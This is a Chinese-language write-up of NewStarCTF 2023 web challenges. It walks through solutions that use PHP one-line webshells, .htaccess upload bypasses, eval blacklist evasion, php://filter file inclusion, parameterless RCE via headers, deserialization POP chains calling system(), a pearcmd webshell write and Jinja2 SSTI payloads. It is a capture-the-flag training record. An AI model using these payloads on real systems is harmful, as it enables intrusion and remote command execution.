---
tags:
  - ctf
---
# 2023-NewstarCTF

## WEB

### WEEK1-泄露的秘密

题型:信息泄露

漏洞原因:www.zip、robots.txt文件

首先访问/robots.txt 可以得到一半的flag

但是这时候可以尝试去访问网站备份 .bak .svn .swp

都不行 再想想是否可能下载得了备份文件 访问/www.zip下载到网站源码 查看即可

### WEEK1-ErrorFlask

题型:Flask报错页面信息泄露

漏洞原因:Flask报错页面信息泄露

题目提示：输入number1 number2

尝试使用GET方式传值

```html
url/?number1=1&number2=1
```

可以看到页面回显 不是SSTI 也就是说题型并不属于模板注入

因为已经提示框架属于flask

尝试让他报错 查看详细的错误代码

```html
url/?number1=1&number2=str
```

回显报错页面 查看代码错误点 即可找到flag

### WEEK1-Begin of Upload

题型:PHP文件上传

漏洞原因:仅有前端限制

上传一句话木马

```php
<?php
@eval($_POST['123']);
?>
```

通过BP抓包 修改后缀

```
Content-Disposition: form-data; name="file"; filename="1.php"
```

蚁剑访问

```
/upload/1.php
```

查找到flag

### WEEK1-Begin of HTTP

题型:HTTP常见请求头、HTTP请求方式

漏洞原因:HTTP请求头

打开页面 要求GET方式传输ctf参数

```
url/?ctf=123
```

跳转页面 需要POST方式传参 参数名称为secret 并且需要正确的secret参数

通过F12找到secret

```
 Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) 
```

base64解码

```
n3wst4rCTF2023g00000d
```

使用POST传参

```
secret=n3wst4rCTF2023g00000d
```

根据题目要求 修改消息头User-Agent、Referer、X-Real-IP

```http
POST /?ctf=123 HTTP/1.1
Host: node4.buuoj.cn:26003
User-Agent: NewStarCTF2023
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: newstarctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Connection: close
Cookie: power=ctfer
Upgrade-Insecure-Requests: 1
Origin: localhost
X-Forwarded-For: 127.0.0.1

X-Real-IP: 127.0.0.1

secret=n3wst4rCTF2023g00000d
```

https://blog.csdn.net/weixin_45963786/article/details/112913121



### WEEK1-RCE

题型:md5碰撞、PHP特殊符号传参、PHP命令执行、黑名单绕过

漏洞原因:eval($code)

相关链接：https://blog.csdn.net/weixin_47102975/article/details/109537233

源代码如下

```php
 <?php
highlight_file(__FILE__);
if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
    $password=md5($_POST['password']);
    $code=$_POST['e_v.a.l'];
    if(substr($password,0,6)==="c4d038"){
        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){
            eval($code);
        }
    }
} 
?>
```

POST传入password与e_v.a.l

php 会自动把一些不合法的字符转化为下划线

为了防止我们的点被自动转换，我们可以先让第一个下划线位置为不合法字符，从而转换为下划线，不会再转换后面的点。比如可以传入 e[v.a.l。

除此之外 不合法字符还有` <空格>` 、` 。`、`[`



编写一段python脚本进行碰撞 找到对应的md5后位c4d038的值

```python
import hashlib
def crack(pre):    
    for i in range(0, 999999):       
        if (hashlib.md5(str(i).encode("UTF-8")).hexdigest())[0:6] == str(pre):
            print(i)

breakcrack("c4d038")
```

随后就是解决eval()函数的命令执行 这里绕过了system()还有不少命令



可以使用通配符进行绕过 因为

```php
echo `ls` = system('ls')
```

```php
eval(<?php echo `ls` ?>) = system('ls')
```

又因为cat命令在bin文件夹内

```php+HTML
<?php echo `/bin/cat /flag` ?>
<!--短标签+通配符--!>
?><?=`/???/??? /????`?>
```

payload:

```
password=114514&e[v.a.l=?code=?><?=`/???/??? /????`?>
```

除此之外 还有另外一种方法

可以看到是禁止了 system 函数，可以采用 php 自带的函数来达到一样的效果，先使用 scandir 看一下目录，注意 scandir 是不会回显输出的，记得加上 var_dump。

```php
e[v.a.l=var_dump(scandir('/'));
```

看到了 flag 在根目录下。但是黑名单过滤了 flag 关键字，我们没法直接读取，于是可以使用参数逃逸绕过限制：

```php
POST:password=114514&e[v.a.l=var_dump(file_get_contents($_POST['a']));&a=/flag
```

得到flag。

### WEEK1-Begin of PHP

题型:php弱类型、PHP加密函数数组绕过、PHP函数特性、变量覆盖漏洞

漏洞原因:源代码中各个函数

```php+HTML
 <?php
error_reporting(0);
highlight_file(__FILE__);

if(isset($_GET['key1']) && isset($_GET['key2'])){
    echo "=Level 1=<br>";
    if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
        $flag1 = True;
    }else{
        die("nope,this is level 1");
    }
}

if($flag1){
    echo "=Level 2=<br>";
    if(isset($_POST['key3'])){
        if(md5($_POST['key3']) === sha1($_POST['key3'])){
            $flag2 = True;
        }
    }else{
        die("nope,this is level 2");
    }
}

if($flag2){
    echo "=Level 3=<br>";
    if(isset($_GET['key4'])){
        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
            $flag3 = True;
        }else{
            die("nope,this is level 3");
        }
    }
}

if($flag3){
    //is_numeric函数特性，在传入的数字后加入任意字母即可
    echo "=Level 4=<br>";
    if(isset($_GET['key5'])){
        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
            $flag4 = True;
        }else{
            die("nope,this is level 4");
        }
    }
}

if($flag4){
    echo "=Level 5=<br>";
    extract($_POST);
    foreach($_POST as $var){
        if(preg_match("/[a-zA-Z0-9]/",$var)){
            die("nope,this is level 5");
        }
    }
    if($flag5){
        echo file_get_contents("/flag");
    }else{
        die("nope,this is level 5");
    }
} 
```

payload

```php
?key1=QNKCDZO&key2=240610708&key4[]=1&key5[]=5050
key3[]=1&flag5=_
```

### WEEK1-EasyLogin

题型:信息收集

漏洞原因:shell操作 弱口令

```linux
ctrl+c
ctrl+d
```

可以返回shell面板

查看历史命令输入，发现有弱口令登录，使用BP进行弱口令爆破。

发现抓包输入:

```bp
un=admin&pw=4911e516e5aa21d327512e0c8b197616&rem=0
```

密码是通过md5加密后传输的，弱口令爆破需要把弱口令都转为MD5

查看历史命令输入，提示使用BP抓包，发现302跳转，重发发现flag。

### WEEK2-游戏高手

题型:js动态调试

漏洞原因:js动态调试

```js
/*********飞机大战************/
var width = window.innerWidth > 480 ? 480 : window.innerWidth,
    height = window.innerHeight > 650 ? 650 : window.innerHeight - 20;

var canvas = document.getElementById('canvas');
canvas.width = width;
canvas.height = height;
var ctx = canvas.getContext('2d');
/********定义游戏状态***********/
const PHASE_DOWNLOAD = 1;
const PHASE_READY = 2;
const PHASE_LOADING = 3;
const PHASE_PLAY = 4;
const PHASE_PAUSE = 5;
const PHASE_GAMEOVER = 6;
/**********游戏当前状态************/
var curPhase = PHASE_DOWNLOAD;
var gameScore = 0;
// 所以图片的链接，包括背景图、各种飞机和飞机爆炸图、子弹图等
var imgName = ['background.png', 'game_pause_nor.png', 'm1.png', 'start.png', 
    // 敌机1
    ['enemy1.png', 'enemy1_down1.png', 'enemy1_down2.png', 'enemy1_down3.png', 'enemy1_down4.png'],
    // 敌机2
    ['enemy2.png', 'enemy2_down1.png', 'enemy2_down2.png', 'enemy2_down3.png', 'enemy2_down4.png'],
    // 敌机3
    ['enemy3_n1.png', 'enemy3_n2.png', 'enemy3_hit.png', 'enemy3_down1.png', 'enemy3_down2.png', 'enemy3_down3.png', 'enemy3_down4.png', 'enemy3_down5.png', 'enemy3_down6.png', ],
    // 游戏loading图
    ['game_loading1.png', 'game_loading2.png', 'game_loading3.png', 'game_loading4.png'],
    // 玩家飞机图
    ['hero1.png', 'hero2.png', 'hero_blowup_n1.png', 'hero_blowup_n2.png', 'hero_blowup_n3.png', 'hero_blowup_n4.png']
];
// 存储不同类型的图片
var bg = null,
    pause = null,
    m = null,
    startImg = null,
    enemy1 = [],
    enemy2 = [],
    enemy3 = [],
    gameLoad = [],
    heroImg = [];
// 加载图片的进度
var progress = 1;
/*********加载图片*********/
function download() {
    bg = nImg(imgName[0]);
    pause = nImg(imgName[1]);
    m = nImg(imgName[2]);
    startImg = nImg(imgName[3]);
    for (var i = 0; i < imgName[4].length; i++) {
        enemy1[i] = nImg(imgName[4][i]);
    }
    for (var i = 0; i < imgName[5].length; i++) {
        enemy2[i] = nImg(imgName[5][i]);
    }
    for (var i = 0; i < imgName[6].length; i++) {
        enemy3[i] = nImg(imgName[6][i]);
    }
    for (var i = 0; i < imgName[7].length; i++) {
        gameLoad[i] = nImg(imgName[7][i]);
    }
    for (var i = 0; i < imgName[8].length; i++) {
        heroImg[i] = nImg(imgName[8][i]);
    }

    function nImg(src) {
        var img = new Image();
        img.src = 'img/' + src;
        img.onload = imgLoad;
        return img;
    }
    // 绘制游戏加载进度画面
    function imgLoad() {
        progress += 3;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        var text = progress + '%';
        var tw = ctx.measureText(text).width;
        ctx.font = '60px arial';
        ctx.fillStyle = 'red';
        ctx.lineWidth = '0';
        ctx.strokeStyle = '#888';
        //ctx.strokeText(text,(width-tw)/2,height/2);
        ctx.fillText(text, (width - tw) / 2, height / 2);
        if (progress >= 100) {
            start();
        }
    }
}
download();

/*********开始游戏**************/
function start() {
    curPhase = PHASE_READY;
    canvas.onclick = function() {
        curPhase == PHASE_READY && (curPhase = PHASE_LOADING);
    }
    ctx.fillStyle = '#963';
    ctx.font = '24px arial';
    hero = new Hero();
    gameEngine();
}
/********画背景*******/
function paintBg() {
    var y = 0;
    function paintBg() {
        ctx.drawImage(bg, 0, y);
        ctx.drawImage(bg, 0, y - 852);
        y++ == 852 && (y = 0);
    }
    return paintBg;
}

/**********画game开始图*********/
function paintLogo() {
    ctx.drawImage(startImg, 40, 0);
}
/*******************/
function loading() {
    this.index = 0;

    function loading() {
        this.index % 1 == 0 && ctx.drawImage(gameLoad[index], 0, canvas.height - gameLoad[0].height);
        this.index += 0.5;
        if (this.index > 3) {
            curPhase = PHASE_PLAY;
            this.index =0;
        }
    }
    return loading;
}
/*********构造hero************/
var hero = null;

function Hero() {
    this.x = (width - heroImg[0].width) / 2;  // hero的坐标
    this.y = height - heroImg[0].height;
    this.index = 0; // 用于切换hero的图片
    this.count = 0; // 用于控制hero图片切换的频率
    this.hCount = 0; // 用于控制子弹发射的频率
    this.eCount = 0; // 用于控制敌机出现的频率    
    this.n = 0;
    this.life=0;
    this.draw = function() {
	    this.count++;
        this.hit();
        if(this.index>4){
	    curPhase =PHASE_GAMEOVER; 
	    this.index=5;     
	    } 
        if (this.count % 3 == 0&&this.index<=1) { // 切换hero的图片
          	this.index = this.index == 0 ? 1 : 0;
            this.count = 0;
        }
       
        ctx.drawImage(heroImg[this.index], this.x, this.y);
        ctx.fillText('SCORE:' + gameScore, 10, 30);
       
        this.hCount++;
        if (this.hCount % 3 == 0) { // 同时生成三颗子弹
            this.n == 32 && (this.n = 0); 
            hullet.push(new Hullet(this.n));
            this.n == 0 && (this.n = -32);;
            hullet.push(new Hullet(this.n));
            this.n == -32 && (this.n = 32);;
            hullet.push(new Hullet(this.n));
            this.hCount = 0;
        }
        this.eCount++;
        if (this.eCount % 8 == 0) { //生成敌机
            liveEnemy.push(new Enemy());
            this.eCount = 0;
        }
    }
    this.hit = function() { //判断是自己是否被击中
        for (var i = 0; i < liveEnemy.length; i++) {
            var d = liveEnemy[i];
            // 敌机与自己的碰撞检测
            var px, py;  
        	px = this.x <= d.x ? d.x : this.x;  
        	py = this.y <= d.y ? d.y : this.y;  
  
        	// 判断点
       		if (px >= this.x && px <= this.x + heroImg[0].width && py >= this.y && py <= this.y + heroImg[0].height && px >= d.x && px <= d.x + d.width && py >= d.y && py <= d.y + d.height) {  
				this.life++;
            	if(this.life>30){
	            	if(this.index<=2){
		            	this.index=3;
	            	}
					this.index++; 
					this.life=0;
	            } 
        	} 
        }
    }

    function move(e) {
        if (curPhase == PHASE_PLAY || curPhase == PHASE_PAUSE) {
            curPhase = PHASE_PLAY;
            var offsetX = e.offsetX || e.touches[0].pageX;
            var offsetY = e.offsetY || e.touches[0].pageY;
            var w = heroImg[0].width,
                h = heroImg[0].height;
            var nx = offsetX - w / 2,
                ny = offsetY - h / 2;
            nx < 20 - w / 2 ? nx = 20 - w / 2 : nx > (canvas.width - w / 2 - 20) ? nx = (canvas.width - w / 2 - 20) : 0;
            ny < 0 ? ny = 0 : ny > (canvas.height - h / 2) ? ny = (canvas.height - h / 2) : 0;
            hero.x = nx;
            hero.y = ny;
            hero.count = 2;
        }
    }
    // 绑定鼠标移动和手指触摸事件，控制hero移动
    canvas.addEventListener("mousemove", move, false);
    canvas.addEventListener("touchmove", move, false);
    // 鼠标移除时游戏暂停
    canvas.onmouseout = function(e) {
        if (curPhase == PHASE_PLAY) {
            curPhase = PHASE_PAUSE;
        }
    }
}


/**********构造子弹***********/
var hullet = []; // 存储画布中所以子弹的数组

function Hullet(n) {
    this.n = n;  // 用于确定是左中右哪一颗子弹
    // 子弹的坐标
    this.mx = hero.x + (heroImg[0].width - m.width) / 2 + this.n; 
    this.my = this.n == 0 ? hero.y - m.height : hero.y + m.height;
    this.width = m.width;  // 子弹的宽和高
    this.height = m.height;
    this.removable = false; // 标识子弹是否可移除了
}
Hullet.drawHullet = function() {
    for (var i = 0; i < hullet.length; i++) { //在画布上画出所以子弹
        hullet[i].draw();
        if (hullet[i].removable) { // 如果为true就移除这颗子弹
            hullet.splice(i, 1);
        }
    }
}
Hullet.prototype.draw = function() { // 在画布上画子弹
    ctx.drawImage(m, this.mx, this.my);
    this.my -= 20;
    this.mx += this.n == 32 ? 3 : this.n == -32 ? -3 : 0;
    if (this.my < -m.height) {  // 如果子弹飞出画布，就标记为可移除
        this.removable = true;
    };
}


/***********构造敌机********/
var liveEnemy = []; // 用于存储画布上的所有敌机

function Enemy() {
    this.n = Math.random() * 20;
    this.enemy = null; // 保存敌机图片的数组
    this.speed = 0; // 敌机的速度
    this.lifes = 2; // 敌机的生命值
    if (this.n < 1) { // 不同大小的敌机随机出现
        this.enemy = enemy3[0]; 
        this.speed = 2;
        this.lifes = 50;
    } else if (this.n < 6) {
        this.enemy = enemy2[0];
        this.speed = 4;
        this.lifes = 10;
    } else {
        this.enemy = enemy1[0];
        this.speed = 6;
    }
    this.x = parseInt(Math.random() * (canvas.width - this.enemy.width));
    this.y = -this.enemy.height;
    this.width = this.enemy.width;
    this.height = this.enemy.height;
    this.index = 0;
    this.removable = false;
    // 标识敌机是否狗带，若狗带就画它的爆炸图(也就是遗像啦)
    this.die = false;
    this.draw = function() {
        // 处理不同敌机的爆炸图轮番上阵
        if (this.speed == 2) {
            if (this.die) {
                if (this.index < 2) { this.index = 3; }
                if (this.index < enemy3.length) {
                    this.enemy = enemy3[this.index++];
                } else {
                    this.removable = true;
                }
            } else {
                this.enemy = enemy3[this.index];
                this.index == 0 ? this.index = 1 : this.index = 0;
            }
        } else if (this.die) {
            if (this.index < enemy1.length) {
                if (this.speed == 6) {
                    this.enemy = enemy1[this.index++];
                } else {
                    this.enemy = enemy2[this.index++];
                }
            } else {
                this.removable = true;
            }
        }
        ctx.drawImage(this.enemy, this.x, this.y);
        this.y += this.speed; // 移动敌机
        this.hit(); //判断是否击中敌机
        if (this.y > canvas.height) { // 若敌机飞出画布，就标识可移除(让你不长眼！)
            this.removable = true;
        }
    }
    this.hit = function() { //判断是否击中敌机
        for (var i = 0; i < hullet.length; i++) {
            var h = hullet[i];
            // 敌机与子弹的碰撞检测，自己体会吧
            if (this.x + this.width >= h.mx && h.mx + h.width >= this.x &&
                h.my + h.height >= this.y && this.height + this.y >= h.my) {
                if (--this.lifes == 0) { // 若生命值为零，标识为死亡
                    this.die = true;
                    // 计分
                    gameScore += this.speed == 6 ? 10 : this.speed == 4 ? 20 : 100;
                }
                h.removable = true; // 碰撞后的子弹标识为可移除
            }
        }
    }
}

function drawEnemy() {
    for (var i = 0; i < liveEnemy.length; i++) {
        if (liveEnemy[i].removable) {
            liveEnemy.splice(i, 1);
        }
    }
    for (var i = 0; i < liveEnemy.length; i++) {
        liveEnemy[i].draw();
    }
}
/*******游戏暂停*******/
function drawPause() {
    ctx.drawImage(pause, (width - pause.width) / 2, (height - pause.height) / 2);
}
//游戏结束
function gameover(){
    if(gameScore > 100000){
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/api.php", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var response = JSON.parse(xhr.responseText);
            alert(response.message);
        }
        };
        var data = {
            score: gameScore,
        };
        xhr.send(JSON.stringify(data));
    }
	alert("成绩："+gameScore);
	gameScore=0;  
	curPhase =PHASE_READY;  
	hero = null;
	hero = new Hero();  	    
}
/**********游戏主引擎*********/
var pBg = paintBg();
var load = loading();

function gameEngine() {
    switch (curPhase) {
        case PHASE_READY:
            pBg();
            paintLogo();
            break;
        case PHASE_LOADING:
            pBg();
            load();
            break;
        case PHASE_PLAY:
            pBg();
            drawEnemy();
            Hullet.drawHullet();
            hero.draw();
            break;
        case PHASE_PAUSE:
            drawPause();
            break;
        case PHASE_GAMEOVER:
            gameover();
            break;    
    }
    //requestAnimationFrame(gameEngine);
}
setInterval(gameEngine, 50);
```

主要是这段函数的作用

```js
function gameover(){
    if(gameScore > 100000){
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/api.php", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var response = JSON.parse(xhr.responseText);
            alert(response.message);
        }
        };
        var data = {
            score: gameScore,
        };
        xhr.send(JSON.stringify(data));
    }
	alert("成绩："+gameScore);
	gameScore=0;  
	curPhase =PHASE_READY;  
	hero = null;
	hero = new Hero();  	    
}
```

当`gameScore`大于100000时，会给/api.php发送请求，请求的内容为`{score:"xxx"}`的json数据。

可以通过BP重放或者进入控制台给`gameScore`赋值

### WEEK2-Upload again!

题型:文件上传

漏洞原因:.htaccess文件修改 文件上传绕过

`.htaccess`文件里面可以修改一项参数，让服务器把特定文件当做指定文件进行解析。也就是可以通过上传png、jpg文件让服务器把该文件当做php执行，实现绕过得到shell。

```htaccess
AddType application/x-httpd-php .png
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .txt
```

而对于文件内容含有过滤，当过滤掉`<?`时，可以通过以下方式绕过php的闭合方式。

```html
<script language='php'>@eval($_POST['123']);</script>
```

实现执行特定代码。

### WEEK2-include 0。0

题型:文件包含

漏洞原因:过滤 `base` 、`rot`

相关参考链接:

https://blog.csdn.net/qq_45449318/article/details/113629758

https://xz.aliyun.com/t/8163#toc-3

https://www.leavesongs.com/PENETRATION/php-filter-magic.html

【伪协议】https://cloud.tencent.com/developer/article/2070134

源码：

```php+HTML
<?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?>
```

`@include()`不会抛出异常

题目的意思是过滤了php伪协议中的读取过滤器中的`read=convert.base64-decode`编码和`read=string.rot13`编码

通过相关参考链接里面可以得知

```php
?file=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php
```

将文件的内容以UTF-8的格式转化为UTF-7编码

`convert.iconv`可用的字符集：

【伪协议过滤器】https://blog.csdn.net/wangyuxiang946/article/details/131149171

### WEEK2-R!!C!!E!!

题型:git信息泄露 无参数RCE

漏洞原因:git源码信息泄露 RCE

GitHack使用：

```python
# 报错原因（一）：common.py中抛出多个异常并没有用括号
# 报错原因（二）：urlparse模块属于python2.7的东西 后面貌似被python3中的urllib.parse替代了
```

综上，使用方法为

```linux
python2 GitHack.py [url]/.git/
```

获得题目的重要源码：

```php
<?php
highlight_file(__FILE__);
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {
    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){
        eval($_GET['star']);
    }
}
```

相关参考链接:

【PHP无参数RCE】https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/

```php
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star']));
#该判断是要求参数star的值只能以
#a(b(c()));且不能携带参数
```

二次过滤了特殊函数，`eval(end(getallheaders()));`，再自定义一个请求头`system('ls /');`不可行

可以通过函数`getallheaders()`

【PHP无参数RCE的相关函数】https://blog.51cto.com/u_15057851/4220891

WP的思路是：消息头最后添加执行的代码->获取消息头->消息头数组逆序->获取当前第一个的内容输出

这里要注意，貌似消息头的默认顺序是根据字母的大小来排序的，需要自定义的消息头为最后一个，最好以`Z`开头。

```php
?star=eval(current(array_reverse(getallheaders())));
#getallheaders() 获取消息头的所有内容 并提取为数组
#array_reverse() 将数组逆序排列
#current() pos() 获取数组的第一个元素
#eval() 执行该内容
```

定义最后一个消息头内的元素为`system('任意指令');`即可，原WP使用的是`system('cat /f*')`来打开根目录下匹配f开头的所有文件

### WEEK2-Unserialize？

题型:php反序列化

漏洞原因:反序列化

题目源码：

```php+HTML
 <?php
highlight_file(__FILE__);
// Maybe you need learn some knowledge about deserialize?
class evil {
    private $cmd;

    public function __destruct()
    {
        if(!preg_match("/cat|tac|more|tail|base/i", $this->cmd)){
            @system($this->cmd);
        }
    }
}

@unserialize($_POST['unser']);
?> 
```

post传输一个unser的参数，进行序列化。

源代码中构建了一个evil对象，有一个私有对象`$cmd`，一个魔术方法，在该对象被销毁时触发，过滤部分关键字后执行`$cmd`

exp：

```php+HTML
 <?php
class evil{
    private $cmd="ls";
}

echo urlencode(serialize(new evil)
?> 
```



### WEEK3-Include 🍐

题型:文件包含 远程执行RCE

漏洞原因:PHP中 register_argc_argv参数为ON  percmd.php利用

题目源码：

```php+HTML
 <?php
    error_reporting(0);
    if(isset($_GET['file'])) {
        $file = $_GET['file'];
        
        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
            die('hacker!');
        }
        
        include($file.".php");
        # Something in phpinfo.php!
    }
    else {
        highlight_file(__FILE__);
    }
?> 
```

过滤了许多，无法使用`filter://`、`php://input`、`data://`伪协议，可以查看phpinfo.php中的参数，同时包含的文件会自动添加`.php`后缀。

题目貌似暗示了`pear`，搜索出来相关参考链接：https://blog.csdn.net/qq_52988816/article/details/127078373

```html
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo();?>+/tmp/shell.php
//由于file会填补.php 所以pearcmd不用添加.php
?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=phpinfo();?>+/tmp/shell.php
```

直接构造

```html
?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST[0]);?>+/tmp/cmd.php

访问:
/tmp/cmd
post:
0=system("cat /flag");
```

官方WP提供的参考链接：https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxMzg1NTQsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODEzODI1NCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMjk2NjIzOX0.5_cbheSrHYfOuUTv157TTzfsitJ6jLXGMqp3lRi9sqI

其他博客的参考链接：

https://blog.csdn.net/m0_63138919/article/details/133958661

### WEEK3-POP Gadget

题型:POP链反序列

漏洞原因:PHP反序列化POP链

题目源码：

```php+HTML
 <?php
highlight_file(__FILE__);

class Begin{
    public $name;

    public function __destruct()
    {
        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
            echo "Hello";
        }else{
            echo "Welcome to NewStarCTF 2023!";
        }
    }
}

class Then{
    private $func;

    public function __toString()
    {
        ($this->func)();
        return "Good Job!";
    }

}

class Handle{
    protected $obj;

    public function __call($func, $vars)
    {
        $this->obj->end();
    }

}

class Super{
    protected $obj;
    public function __invoke()
    {
        $this->obj->getStr();
    }

    public function end()
    {
        die("==GAME OVER==");
    }
}

class CTF{
    public $handle;

    public function end()
    {
        unset($this->handle->log);
    }

}

class WhiteGod{
    public $func;
    public $var;

    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}

@unserialize($_POST['pop']); 
```

由题目得知，我们最终是要想办法触发`WhiteGod->__unset()方法`，这样就能够通过构造**WhiteGod(func,cmd)**类，传入需要执行的函数和命令（例如`system("ls")`）。

要触发`WhiteGod->__unset()方法`，就必须有一个`unset(WhiteGod->不存在)`，也就是**CTF(WhiteGod(func,cmd))**，并且要想办法触发`CTF->end()`。

要触发`CTF->end()`方法，就只能通过`Handle(CTF)`，也就是**Handle(CTF(WhiteGod(func,cmd)))**。并且要想办法触发`Handle->__call()`。

要触发`Handle->__call()`方法，就需要出现`Handle->不存在`，即`Handle->不存在getStr()`，也就是**Super(Handle(CTF(WhiteGod(func,cmd))))**，并且要想办法触发`Super->__invoke()`。

要触发`Super->__invoke()方法`，就需要出现`(Super)();`即Super被当做函数名调用，也就是**Then(Super(Handle(CTF(WhiteGod(func,cmd)))))**，并且要想办法触发`Then->__toString()方法`。

要触发`Then->__toString()方法`，就需要`Then被当做字符串处理`，即`Begin()->__destruct()`中的正则。也就是**Begin(Then(Super(Handle(CTF(WhiteGod(func,cmd)))))**

这样，完整的POP链就构造出来了

```php+HTML
 <?php
highlight_file(__FILE__);

class Begin{
    public $name;
    public function __construct($a)
    {
        $this->name=$a;
    }
}

class Then{
    private $func;
    public function __construct($a)
    {
        $this->func=$a;
    }
}

class Super{
    protected $obj;
    public function __construct($a)
    {
        $this->obj=$a;
    }

}

class Handle{
    protected $obj;
    public function __construct($a){
        $this->obj=$a;
    }

}


class CTF{
    public $handle;
    public function __construct($a){
        $this->handle=$a;
    }
}

class WhiteGod{
    public $func;
    public $var;
    public function __construct($a,$b){
        $this->func=$a;
        $this->var=$b;
    }
}

echo urlencode(serialize(new Begin(new Then(new Super(new Handle(new CTF(new WhiteGod(func,cmd)))))));
?>
```

由于最后调用的是`func(cmd);`，所以可以尝试使用`system("ls")`即

```php+HTML
echo urlencode(serialize(new Begin(new Then(new Super(new Handle(new CTF(new WhiteGod("system","ls")))))));
```

可以执行，官方文档中提到了类中有保护或私有属性的成员，需要对序列化数据进行URL编码，所以使用`urlencode()`函数。



### WEEK3-GenShin

题型:python SSTI模板注入

漏洞原因:模板渲染引擎对{{}}等过滤不清

进入环境，提示`Oh!try to find some information that is useful~`。

在查看前端源码后并没有什么特别的地方，本来以为是不是有什么特殊的路由存在传参`（实际上也是存在特殊路由）`，于是使用`dirb`进行目录爆破，找到响应码为200或者302的内容。结果找到了个`url/console`，这个貌似是python写的web后台都有？

后面找了一阵子，没找到什么特别的东西。遗漏了http响应头里面的属性，`Pop: /secr3tofpop`，这里存在一个特殊路由。

访问->`please give a name by get`，说明使用GET方法传一个`name`参数。

`?name=8`->正常回显

`?name={{}}`->`big hacker!get away from me!`

被过滤了，题目的考点就是这个地方。

SSTI相关参考链接：https://www.cnblogs.com/bmjoker/p/13508538.html

------

访问到`/console`路由->使用的是`python`环境`(不知道是不是这样判断是python的SSTI)`

判断出python SSTI->再判断是什么引擎。`jinja2`、`tornado`、`Django`

都试试弹出报错页面->`jinja2`。

由于jinja2可以直接访问python的一些对象和方法，可以通过下面构造继承链来实现功能。

```jinja2
__dict__　　 ：保存类实例或对象实例的属性变量键值对字典
__class__　　：返回一个实例所属的类
__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组
// __base__和__mro__都是用来寻找基类的
__subclasses__　　：以列表返回类的子类
__init__　　 ：类的初始化方法
__globals__　　   ：对包含函数全局变量的字典的引用__builtin__&&__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　
1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　
2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身
```

------

通过`{%print()%}`来输出命令执行内容。

通过`().__class__.__base__.__subclasses__()`获得所有的子类。

```python
{%print(().__class__.__base__.__subclasses__())%}
```

得到回显：

```pyt
 [<class 'type'>·········<class 'werkzeug._reloader.ReloaderLoop'>]
```

可以通过改变下列`i(列表中对应的键)`的值来找到对应子类的内置方法：

```python
().__class__.__bases__[0].__subclasses__()[i]
```

可以通过`i(列表中对应的值)`下列来访问具体子类可以调用的东西：

```python
i.__init__.__globals__.keys()
i["__in"+"it__"].__globals__.keys()
```

详细参考相关链接。

------

【1】首先通过`{%print(().__class__.__base__)%}`获取当前类的父类,随后可以通过（父类较多的时候记得`__base__[编号]`）`{%print(().__class__.__base__.__subclasses__())%}`获取当前类的父类的所有子类

【2】然后搜索响应内容，找到包含`os`的板块`（该题目中是<class 'os._wrap_close'>）`

【3】通过`{%print(().__class__.__base__.__subclasses__()[具体的编号].__init__.__globals__)%}`获取指定类的`__init__`方法的全局命名空间`__globals__`，并返回该命名空间中所有全局变量的名称和对应的值【`__init__`被过滤了就通过`["__in"+"it__"]`绕过】

【4】在`{%print(().__class__.__base__.__subclasses__()[132]["__in"+"it__"].__globals__.keys())%}`发现了`listdir`方法，可以通过`{%print(().__class__.__base__.__subclasses__()[132]["__in"+"it__"].__globals__.listdir("."))%}`查看当前指定目录下的文件名，找到flag就在当前目录下。

